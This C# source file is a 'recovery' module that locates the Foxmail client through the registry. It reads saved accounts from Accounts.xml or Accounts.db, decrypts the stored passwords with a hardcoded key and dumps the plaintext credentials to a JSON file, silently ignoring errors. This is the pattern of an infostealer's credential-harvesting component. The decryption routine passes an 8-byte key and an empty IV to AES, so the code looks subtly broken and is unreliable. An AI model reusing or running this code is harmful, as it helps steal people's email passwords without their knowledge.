using Org.BouncyCastle.Crypto.Parameters;
using RecoveryTool.Recovery.Utilities;
using Org.BouncyCastle.Security;
using Microsoft.Data.Sqlite;
using System.Text.Json;
using Microsoft.Win32;
using System.Xml.Linq;
using System.Text;

namespace RecoveryTool.Recovery.EmailClients
{
    public class FoxMailService
    {
        public record FoxMailAccountInfo(string Account, string Password, bool IsPOP3);

        private static readonly byte[] Key = [0x7e, 0x46, 0x40, 0x37, 0x25, 0x6d, 0x24, 0x7e];
        private const byte FirstByteDifference = 0x71;

        public static List<FoxMailAccountInfo> SaveFoxMailAsync()
        {
            string foxMailPath = GetFoxMailLocation();
            if (string.IsNullOrEmpty(foxMailPath)) return [];
            
            string accountsPath = Path.Combine(foxMailPath, "Storage");
            var accounts = ParseAccountsData(accountsPath);

            SaveAccountsToFile(accounts);

            return accounts;
        }

        private static void SaveAccountsToFile(List<FoxMailAccountInfo> accounts)
        {
            try
            {
                string destDir = Common.EnsureFoxMailPath();
                string fileName = "Content.json";
                string filePath = Path.Combine(destDir, fileName);

                string jsonContent = JsonSerializer.Serialize(accounts, new JsonSerializerOptions
                {
                    WriteIndented = true
                });

                File.WriteAllText(filePath, jsonContent);
            } catch { }
        }

        private static string? GetFoxMailLocation()
        {
            const string regPath = @"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command";
            var regValue = GetRegistryValue(Registry.LocalMachine, regPath)
                        ?? GetRegistryValue(Registry.CurrentUser, regPath);

            if (string.IsNullOrEmpty(regValue)) return null;

            var parts = regValue.Split('"', StringSplitOptions.RemoveEmptyEntries);
            return parts.Length > 0 ? Path.GetDirectoryName(parts[0]) : null;
        }

        private static string? GetRegistryValue(RegistryKey hive, string path)
        {
            using var key = hive.OpenSubKey(path);
            return key?.GetValue(string.Empty) as string;
        }

        private static List<FoxMailAccountInfo> ParseAccountsData(string accountsPath)
        {
            var accounts = ParseXmlAccounts(accountsPath);
            if (accounts.Count == 0) { accounts = ParseSqliteAccounts(accountsPath); }
            return accounts;
        }

        private static List<FoxMailAccountInfo> ParseXmlAccounts(string accountsPath)
        {
            var accounts = new List<FoxMailAccountInfo>();
            var xmlPath = Path.Combine(accountsPath, "Accounts.xml");

            if (File.Exists(xmlPath))
            {
                try
                {
                    var doc = XDocument.Load(xmlPath);
                    foreach (var account in doc.Descendants("Account"))
                    {
                        var email = account.Element("Email")?.Value;
                        var password = account.Element("Password")?.Value;
                        var type = account.Element("Type")?.Value;

                        if (email is not null && password is not null)
                        {
                            accounts.Add(new FoxMailAccountInfo(
                                email,
                                DecryptPassword(password),
                                type == "POP3"
                            ));
                        }
                    }
                } catch { }
            }
            return accounts;
        }

        private static List<FoxMailAccountInfo> ParseSqliteAccounts(string accountsPath)
        {
            var accounts = new List<FoxMailAccountInfo>();
            var dbPath = Path.Combine(accountsPath, "Accounts.db");

            if (File.Exists(dbPath))
            {
                try
                {
                    using var connection = new SqliteConnection($"Data Source={dbPath}");
                    connection.Open();
                    using var command = connection.CreateCommand();
                    command.CommandText = "SELECT Email, Password, Type FROM Accounts";
                    using var reader = command.ExecuteReader();
                    while (reader.Read())
                    {
                        accounts.Add(new FoxMailAccountInfo(
                            reader.GetString(0),
                            DecryptPassword(reader.GetString(1)),
                            reader.GetString(2) == "POP3"
                        ));
                    }
                } catch { }
            }
            return accounts;
        }

        private static string DecryptPassword(string encryptedPassword)
        {
            try
            {
                var encryptedBytes = Convert.FromHexString(encryptedPassword);
                if (encryptedBytes.Length == 0) return string.Empty;

                encryptedBytes[0] ^= FirstByteDifference;

                var cipher = CipherUtilities.GetCipher("AES/CFB8/NoPadding");
                var keyParam = new KeyParameter(Key);
                var parameters = new ParametersWithIV(keyParam, []);

                cipher.Init(false, parameters);

                var decryptedBytes = new byte[encryptedBytes.Length];
                var length = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, decryptedBytes, 0);
                cipher.DoFinal(decryptedBytes, length);

                return Encoding.UTF8.GetString(decryptedBytes[1..]).TrimEnd('\0');
            } catch { return string.Empty; }
        }
    }
}